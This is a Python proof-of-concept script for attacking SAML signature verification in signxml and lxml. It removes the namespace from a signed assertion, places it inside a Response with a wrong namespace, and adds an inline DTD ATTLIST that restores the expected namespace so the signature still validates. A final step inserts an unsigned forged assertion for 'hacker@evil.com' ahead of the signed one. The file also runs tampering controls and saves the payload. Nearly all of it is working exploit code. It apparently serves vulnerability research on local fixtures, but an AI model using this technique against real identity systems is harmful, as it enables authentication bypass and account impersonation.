"""Correct DTD ATTLIST PoC - proper mechanism understanding.

The attack works because:
1. The signed assertion's xmlns:saml is REMOVED (not replaced)
2. The Response has wrong xmlns:saml (uppercase A)
3. The assertion INHERITS wrong NS from Response
4. DTD ATTLIST provides correct NS as default (since no explicit on assertion)
5. lxml applies DTD default → assertion is in correct NS → c14n matches → sig VALID
"""
import os
from lxml import etree
from signxml import XMLSigner, XMLVerifier
from signxml.algorithms import SignatureConstructionMethod
from cryptography.hazmat.primitives.serialization import load_pem_private_key

FIXTURES = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'targets', 'saml_fixtures')
with open(os.path.join(FIXTURES, 'idp_key.pem'), 'rb') as f:
    KEY = load_pem_private_key(f.read(), password=None)
with open(os.path.join(FIXTURES, 'idp_cert.pem'), 'rb') as f:
    CERT = f.read()

SAML = "urn:oasis:names:tc:SAML:2.0:assertion"
SAMLP = "urn:oasis:names:tc:SAML:2.0:protocol"

# Step 1: Sign assertion
print("=== Step 1: Sign assertion ===")
assertion = etree.fromstring(
    f'<saml:Assertion xmlns:saml="{SAML}" Version="2.0" ID="_test"'
    f' IssueInstant="2026-03-01T00:00:00Z">'
    f'<saml:Issuer>https://idp.example.com</saml:Issuer>'
    f'<saml:Subject><saml:NameID>admin@example.com</saml:NameID></saml:Subject>'
    f'</saml:Assertion>'.encode()
)

signer = XMLSigner(
    method=SignatureConstructionMethod.enveloped,
    c14n_algorithm='http://www.w3.org/2001/10/xml-exc-c14n#',
)
signed = signer.sign(assertion, key=KEY, cert=CERT)
signed_bytes = etree.tostring(signed)

# Step 2: REMOVE the xmlns:saml from the assertion (not replace!)
# This is the key: the assertion should INHERIT NS from parent
print("\n=== Step 2: Remove xmlns:saml from signed assertion ===")
# The xmlns:saml declaration is on the assertion root element
stripped = signed_bytes.replace(
    b' xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"',
    b'',
    1  # Only the first occurrence (on the assertion element)
)
print(f"  Before: xmlns:saml count = {signed_bytes.count(b'xmlns:saml=')}")
print(f"  After:  xmlns:saml count = {stripped.count(b'xmlns:saml=')}")
print(f"  First 150 bytes: {stripped[:150]}")

# Step 3: Build attack with Response having wrong NS + DTD
print("\n=== Step 3: Build attack ===")
attack = (
    b'<?xml version="1.0" encoding="UTF-8"?>'
    b'<!DOCTYPE samlp:Response ['
    b'<!ATTLIST saml:Assertion xmlns:saml CDATA "urn:oasis:names:tc:SAML:2.0:assertion">'
    b']>'
    b'<samlp:Response xmlns:samlp="' + SAMLP.encode() + b'" '
    b'xmlns:saml="urn:oasis:names:tc:SAML:2.0:Assertion" '
    b'ID="_resp" Version="2.0" IssueInstant="2026-03-01T00:00:00Z" '
    b'Destination="https://sp.example.com/acs">'
    b'<saml:Issuer>https://idp.example.com</saml:Issuer>'
    b'<samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>'
    + stripped +
    b'</samlp:Response>'
)

# Step 4: Verify
print("\n=== Step 4: Verify signature ===")
try:
    result = XMLVerifier().verify(attack, x509_cert=CERT)
    nameid = result.signed_xml.find('.//{%s}NameID' % SAML)
    print(f"  SIGNATURE VALID!")
    print(f"  NameID: {nameid.text if nameid is not None else 'N/A'}")
    print(f"  Signed element tag: {result.signed_xml.tag}")
except Exception as e:
    print(f"  SIGNATURE FAIL: {e}")

# Step 5: Verify WITHOUT DTD (should fail)
print("\n=== Step 5: Without DTD ===")
no_dtd = (
    b'<?xml version="1.0" encoding="UTF-8"?>'
    b'<samlp:Response xmlns:samlp="' + SAMLP.encode() + b'" '
    b'xmlns:saml="urn:oasis:names:tc:SAML:2.0:Assertion" '
    b'ID="_resp" Version="2.0" IssueInstant="2026-03-01T00:00:00Z">'
    b'<saml:Issuer>https://idp.example.com</saml:Issuer>'
    b'<samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>'
    + stripped +
    b'</samlp:Response>'
)
try:
    XMLVerifier().verify(no_dtd, x509_cert=CERT)
    print("  WITHOUT DTD: SIGNATURE VALID (unexpected!)")
except Exception as e:
    print(f"  WITHOUT DTD: SIGNATURE FAIL (expected): {str(e)[:80]}")

# Step 6: Verify controls
print("\n=== Step 6: Tampering controls ===")

# 6a: Tamper NameID
attack_nameid = attack.replace(b'admin@example.com', b'hacker@evil.com')
try:
    XMLVerifier().verify(attack_nameid, x509_cert=CERT)
    print("  Tampered NameID: VALID (unexpected!)")
except:
    print("  Tampered NameID: FAIL (correct - content is protected)")

# 6b: Tamper SignatureValue (first 4 chars)
sv_start = attack.find(b'<ds:SignatureValue>') + len(b'<ds:SignatureValue>')
attack_sv = attack[:sv_start] + b'XXXX' + attack[sv_start + 4:]
try:
    XMLVerifier().verify(attack_sv, x509_cert=CERT)
    print("  Tampered SigValue: VALID (unexpected!)")
except:
    print("  Tampered SigValue: FAIL (correct - signature is verified)")

print("\n=== Step 7: Full attack with 2 assertions ===")
# Add evil assertion first, signed assertion second (with DTD NS)
evil_assertion = (
    b'<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" '
    b'Version="2.0" ID="_evil" IssueInstant="2026-03-01T00:00:00Z">'
    b'<saml:Issuer>https://idp.example.com</saml:Issuer>'
    b'<saml:Subject><saml:NameID>hacker@evil.com</saml:NameID></saml:Subject>'
    b'</saml:Assertion>'
)

full_attack = (
    b'<?xml version="1.0" encoding="UTF-8"?>'
    b'<!DOCTYPE samlp:Response ['
    b'<!ATTLIST saml:Assertion xmlns:saml CDATA "urn:oasis:names:tc:SAML:2.0:assertion">'
    b']>'
    b'<samlp:Response xmlns:samlp="' + SAMLP.encode() + b'" '
    b'xmlns:saml="urn:oasis:names:tc:SAML:2.0:Assertion" '
    b'ID="_resp" Version="2.0" IssueInstant="2026-03-01T00:00:00Z" '
    b'Destination="https://sp.example.com/acs">'
    b'<saml:Issuer>https://idp.example.com</saml:Issuer>'
    b'<samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>'
    + evil_assertion
    + stripped +
    b'</samlp:Response>'
)

try:
    result = XMLVerifier().verify(full_attack, x509_cert=CERT)
    nameid = result.signed_xml.find('.//{%s}NameID' % SAML)
    print(f"  Full attack: sig=VALID, nameid={nameid.text if nameid is not None else 'N/A'}")
except Exception as e:
    print(f"  Full attack: sig=FAIL: {str(e)[:80]}")

# Save corrected PoC
RESULTS = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'results')
with open(os.path.join(RESULTS, 'attack_dtd_corrected.xml'), 'wb') as f:
    f.write(attack)
print("\n  Saved corrected PoC to results/attack_dtd_corrected.xml")
